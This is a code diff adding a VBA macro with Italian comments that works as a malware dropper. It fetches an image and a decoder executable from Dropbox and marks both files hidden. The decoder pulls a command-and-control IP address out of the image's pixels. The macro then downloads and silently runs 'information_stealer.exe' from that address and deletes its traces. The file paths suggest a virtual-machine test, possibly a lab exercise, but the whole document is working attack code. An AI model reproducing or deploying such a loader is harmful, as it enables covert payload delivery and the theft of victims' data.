@@ -1,0 +1,129 @@
+Sub Main()
+    Dim imgURL As String
+    Dim imgPath As String
+    Dim ipAddress As String
+    Dim exeURL As String
+    Dim exePath As String
+    Dim objShell As Object
+    Dim result As String
+    Dim informationStealerURL As String
+    Dim informationStealerPath As String
+    
+    ' Percorso dell'immagine
+    imgURL = "https://www.dropbox.com/scl/fi/ojbjsa6vwq3wjbkytnova/Word_with_ip.png?rlkey=q68ko511xvf00jeydcj6ickf0&raw=1"
+    ' Percorso dove salvare l'immagine scaricata
+    imgPath = "C:\Users\vboxuser\Desktop\prova\Word_with_ip.png"
+    
+    ' URL dello script eseguibile
+    exeURL = "https://www.dropbox.com/scl/fi/g4auutmbr8jowy4c4eaj7/decode_ip_from_pixels.exe?rlkey=nwn3skmp6sv6w5ye7disq2w9h&raw=1"
+    ' Percorso dove salvare lo script exe
+    exePath = "C:\Users\vboxuser\Desktop\prova\decode_ip_from_pixels.exe"
+    
+    ' Scarica l'immagine da Dropbox
+    DownloadFile imgURL, imgPath
+    ' Scarica lo script Python da Dropbox
+    DownloadFile exeURL, exePath
+    
+    ' Rendi i file nascosti
+    SetFileHidden imgPath
+    SetFileHidden exePath
+    
+    ' Comando per eseguire l'eseguibile con l'immagine come argomento
+    exeArgs = """" & exePath & """ """ & imgPath & """"
+    
+    ' Esegui lo script per ottenere l'indirizzo IP
+    Set objShell = CreateObject("WScript.Shell")
+    Set execObj = objShell.Exec(exeArgs)
+    
+    ' Leggi l'output dell'esecuzione del comando (l'IP decodificato)
+    result = execObj.StdOut.ReadAll
+    ipAddress = Trim(result)  ' Rimuove eventuali spazi vuoti
+    
+    ipAddress = Replace(ipAddress, vbCr, "")
+    ipAddress = Replace(ipAddress, vbLf, "")
+    
+    ' URL del payload "information_stealer.exe"
+    informationStealerURL = "http://" & ipAddress & ":5000/information_stealer.exe"
+    ' Percorso per salvare il payload
+    informationStealerPath = "C:\Users\vboxuser\Desktop\prova\information_stealer.exe"
+    
+    ' Scarica il payload dal server C2
+    If DownloadFile(informationStealerURL, informationStealerPath) Then
+        ' Rendi il payload nascosto
+        SetFileHidden informationStealerPath
+        ' Esegui il payload
+        objShell.Run """" & informationStealerPath & """", 0, False
+    End If
+    
+    Wait (10) ' Attendere 10 secondi
+    ' Elimina i file scaricati alla fine dell'esecuzione
+    DeleteFile imgPath
+    DeleteFile exePath
+    DeleteFile informationStealerPath
+    
+End Sub
+
+Function DownloadFile(ByVal fileURL As String, ByVal savePath As String) As Boolean
+    On Error GoTo ErrHandler
+    Dim http As Object
+    Dim fileStream As Object
+
+    ' Crea l'oggetto WinHttpRequest per gestire la richiesta HTTP
+    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    http.Option(6) = True ' Segui automaticamente i reindirizzamenti
+    http.Open "GET", fileURL, False
+    http.Send
+
+    ' Controlla se la richiesta ha avuto successo (stato HTTP 200)
+    If http.status = 200 Then
+        ' Crea l'oggetto ADODB.Stream per salvare il file
+        Set fileStream = CreateObject("ADODB.Stream")
+        fileStream.Type = 1 ' Tipo binario
+        fileStream.Open
+        fileStream.Write http.ResponseBody
+        fileStream.SaveToFile savePath, 2 ' Sovrascrivi se il file esiste
+        fileStream.Close
+        DownloadFile = True
+    Else
+        DownloadFile = False
+    End If
+
+    ' Pulisci gli oggetti
+    Set http = Nothing
+    Set fileStream = Nothing
+    Exit Function
+
+ErrHandler:
+    DownloadFile = False
+    If Not fileStream Is Nothing Then fileStream.Close
+    Set http = Nothing
+    Set fileStream = Nothing
+End Function
+
+Sub SetFileHidden(ByVal filePath As String)
+    ' Imposta il file come nascosto
+    Dim objShell As Object
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run "cmd /c attrib +h """ & filePath & """", 0, True
+End Sub
+
+Sub DeleteFile(ByVal filePath As String)
+    ' Elimina il file se esiste
+    On Error Resume Next
+    Dim fso As Object
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    If fso.FileExists(filePath) Then
+        fso.DeleteFile filePath
+    End If
+    On Error GoTo 0
+End Sub
+
+' Funzione per simulare una pausa (sleep) in VBScript
+Sub Wait(ByVal seconds)
+    Dim endTime
+    endTime = Now + TimeValue("00:00:" & seconds)
+    Do While Now < endTime
+        DoEvents ' Rilascia il controllo per evitare che lo script "si blocchi"
+    Loop
+End Sub
+
